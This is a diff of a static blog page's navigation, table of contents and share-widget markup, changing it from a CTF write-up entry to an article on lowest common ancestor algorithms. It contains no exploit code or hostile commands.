-            <span>原始链接:</span><a class="post-url" href="/2022/02/02/actf_2019_onerepeater%20writeup/" title="actf_2019_onerepeater writeup">http://example.com/2022/02/02/actf_2019_onerepeater%20writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2022/02/02/actf_2019_onerepeater%20writeup/　　作者: xia0ji233" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/" title="最近公共祖先求解">http://example.com/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/　　作者: xia0ji233" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -309,15 +287,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/">
-                    二分图入门
+                <a href="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/">
+                    洛谷P6037题解
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">
-                    malloc源码分析
+                <a href="/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/">
+                    洛谷P2656题解
                 </a>
             </div>
         
@@ -329,7 +307,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">部分汇编知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">3.</span> <span class="toc-text">运行结果</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1"><span class="toc-number">1.1.</span> <span class="toc-text">算法设计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.1.</span> <span class="toc-text">一般思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">正确思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%83%E6%89%8B"><span class="toc-number">2.</span> <span class="toc-text">题目练手</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">标程</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -365,7 +343,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"actf_2019_onerepeater writeup　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"最近公共祖先求解　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -385,7 +363,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/" title="上一篇: 二分图入门">
+            <a href="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/" title="上一篇: 洛谷P6037题解">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -393,7 +371,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="下一篇: malloc源码分析">
+            <a href="/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/" title="下一篇: 洛谷P2656题解">
                 <i class="fa fa-angle-right"></i>
             </a>
         
